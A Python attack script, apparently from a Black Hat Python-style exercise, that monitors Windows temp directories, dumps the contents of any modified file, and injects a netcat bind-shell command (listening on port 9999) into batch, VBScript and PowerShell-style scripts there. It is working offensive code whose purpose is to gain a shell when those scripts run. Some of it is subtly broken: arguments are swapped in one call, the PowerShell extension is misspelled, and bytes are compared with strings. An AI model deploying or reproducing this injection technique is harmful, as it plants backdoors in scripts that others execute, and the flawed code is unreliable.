import os
import tempfile
import threading
import win32con
import win32file
import time
import getpass

TIME_LIMIT = time.time() + 60

FILE_CREATED = 1
FILE_DELTED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

NETCAT = f'{os.getcwd()}\\netcat.exe'
TGT_IP = '192.168.56.1' # Victim's IP
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '

# Include other script types and have them run the cmd
FILE_TYPES = {
    '.bat' : ["\r\nREM bhpmarker\r\n", f"\r\n{CMD}\r\n"],
    '.psl' : ["\r\n#bhpmarker\r\n", f"\r\nStart-Process {CMD}\r\n"],
    '.vbs' : ["\r\n'bhpmarker\r\n", f"\r\nCreateObject('Wscript.Shell').Run('{CMD}')\r\n"],
}

CURRENT_USER = getpass.getuser()

FILE_LIST_DIRECTORY = 0x0001
PATHS = [
    'C:\\WINDOWS\\Temp', tempfile.gettempdir(),
    f'C:\\Users\\{CURRENT_USER}\\AppData\\Local\\Temp\\'
]

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('[#] Injected code successfully')

def monitor(path_to_watch):
    try:
        h_directory = win32file.CreateFile(
            path_to_watch,
            FILE_LIST_DIRECTORY,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None
        )
    except Exception as e:
        print(f"[!] Problem trying to call WIN32 API CreateFile: {e}")
        pass
    while time.time() < TIME_LIMIT:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELTED:
                    print(f'[-] Delted {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    print('[^] Dumping contents...')
                    try:
                        fd = open(full_filename, "rb")
                        contents = fd.read()
                        fd.close()
                        print(contents)
                        print('[v] Dump complete.')
                        extension = os.path.splitext(full_filename)[1]
                        if extension in FILE_TYPES:
                            inject_code(full_filename, extension, contents)
                    except Exception as e:
                        print(f'[!] Dump failed: {e}')
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except Exception:
            pass

if __name__=='__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()